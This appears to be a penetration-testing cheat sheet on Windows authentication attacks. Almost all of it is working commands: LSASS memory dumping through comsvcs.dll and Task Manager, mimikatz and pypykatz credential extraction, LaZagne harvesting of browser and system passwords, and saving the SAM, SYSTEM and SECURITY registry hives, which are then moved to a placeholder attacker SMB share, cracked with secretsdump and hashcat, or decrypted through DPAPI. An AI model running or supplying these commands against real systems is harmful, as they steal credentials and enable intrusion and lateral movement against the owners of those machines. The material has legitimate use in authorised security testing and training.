+++
title = "Authentication - Windows"
+++

**Reference:** For detailed information about Windows authentication architecture, processes, DLLs, and credential storage locations, see [Windows Authentication Process]({{% relref "../9 - Notes/Windows Authentication Process" %}}).

### LSASS

```bash
# Remotely dump LSA secrets
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
# Remotely dump SAM secrets
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
```

---

Get LSASS memory dump:

1) Open `Task Manager`
2) Select `Details` > `lsass.exe`
3) Right-Click > "Create Dump File"
4) Move or transfer the file (usually in `%TMP%`)

---

```bash
# Get LSASS PID
tasklist /fi "IMAGENAME eq lsass.exe"
Get-Process lsass

# Dump
powershell -command "rundll32.exe C:\windows\system32\comsvcs.dll,MiniDump <PID> $env:TMP\crash.dmp full"

# Parse creds/hashes from dump
pypykatz lsa minidump <DUMP_FILE>
```

### Credential Manager

```bash
# Backup Stored Creds
rundll32 keymgr.dll,KRShowKeyMgr

---

# List stored creds
cmdkey /list

# Impersonate
runas /savecred /user:<USER> cmd

---

\\tsclient\share\mimikatz.exe
privilege::debug
sekurlsa::credman
```

### Creds Harvesting

```bash
# https://github.com/AlessandroZ/LaZagne
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe

# MOUDLES: browsers, sysadmin, memory, windows, chats, mails, wifi
.\lazagne.exe all -oA -output creds

# Decrypting Firefox or Chrome creds storage
# - https://github.com/unode/firefox_decrypt
# - https://github.com/ohyicong/decrypt-chrome-passwords

---

# WINDOWS: Search for plaintext creds in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.git *.ps1 *.yml *.xml
```

### Secrets Dumping (SAM)
- https://attack.mitre.org/techniques/T1003/002/

```bash
# ATTACKER: create SMB share

# TARGET: save creds hives
reg.exe save HKLM\SAM "%APPDATA%\sam.save"
reg.exe save hklm\SYSTEM "%APPDATA%\system.save"
reg.exe save hklm\SECURITY "%APPDATA%\security.save"

cd %APPDATA%
move *.save \\<ATTACKER_IP\<SHARE>\

# ATTACKER: extract local NT hashes
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

# 1000 is for NT hashes
hashcat -m 1000 <HASHES> <WORDLIST>
# 2100 is for PBKDF2 (DCC2 hashes for domain)
hashcat -m 2100 <HASHES> <WORDLIST>

# DPAPI creds
mimikatz.exe
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

#### Hash Defaults of LM or NTLM

| Hash Value                             | Type   | Meaning / Context                                                                                                            |
| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |
